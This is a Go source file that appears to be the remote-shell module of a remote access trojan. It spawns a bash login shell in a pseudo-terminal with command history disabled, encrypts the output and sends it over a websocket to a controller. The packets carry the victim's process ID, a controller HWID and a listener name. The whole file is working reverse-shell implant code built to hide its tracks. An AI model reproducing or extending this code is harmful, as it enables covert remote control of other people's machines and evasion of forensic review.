package ptyopt

import (
	"io"
	"main/Encrypt"
	"main/MessagePack"
	"main/PcInfo"
	"os"
	"os/exec"
	"regexp"

	"github.com/creack/pty"
	"github.com/togettoyou/wsc"
)

type PtyData struct {
	Stdin  io.WriteCloser
	Stdout io.ReadCloser
}

func InitPtmx() *os.File {
	ws, _ := pty.GetsizeFull(os.Stdin)
	c := exec.Command("/bin/sh", "-c", "export LANG=en_US.UTF-8; exec bash --login")
	c.Env = []string{"HISTFILE=/dev/null"}
	ptmx, err := pty.Start(c)

	if err != nil {
		return nil
	}
	_ = pty.Setsize(ptmx, ws)
	return ptmx
}
func SendData(data []byte, Connection *wsc.Wsc) {
	endata, err := Encrypt.Encrypt(data)
	if err != nil {
		return
	}
	Connection.SendBinaryMessage(endata)
}
func removeANSIEscapeCodes(input string) string {
	re := regexp.MustCompile(`\x1b\[[0-9;]*m`)
	return re.ReplaceAllString(input, "")
}

func RetPtyResult[T any](resBuffer []byte, ProcessPath string, unmsgpack *MessagePack.MsgPack, Connection T, sendFunc func([]byte, T)) {

	//fmt.Println("Raw Output:", removeANSIEscapeCodes(string(resBuffer))) // 打印原始数据// 临时添加这一行
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("shell")
	msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
	msgpack.ForcePathObject("ReadInput").SetAsString(unmsgpack.ForcePathObject("WriteInput").GetAsString() + removeANSIEscapeCodes(string(resBuffer)))
	sendFunc(msgpack.Encode2Bytes(), Connection)
}
